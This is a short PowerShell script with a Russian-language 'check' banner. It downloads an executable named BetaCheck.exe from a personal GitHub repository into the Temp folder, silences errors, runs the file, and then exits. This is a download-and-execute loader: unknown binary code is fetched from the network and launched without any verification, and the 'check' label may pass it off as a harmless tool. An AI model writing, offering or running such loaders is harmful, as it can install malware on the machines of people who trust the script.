
Write-Host "Проверка красным" -ForegroundColor Red

$url = "https://github.com/fayk0180-cmd/BetaCheck/raw/refs/heads/main/BetaCheck.exe"  # 
$output = "$env:Temp\BetaCheck.exe"

Invoke-WebRequest -Uri $url -OutFile $output -ErrorAction SilentlyContinue

if (Test-Path $output) {
    Start-Process $output
} else {
    Write-Host "Файл не скачан" -ForegroundColor Yellow
}

if ($Host.Name -like "*ConsoleHost*") {
    Start-Sleep -Seconds 2  
    exit
}


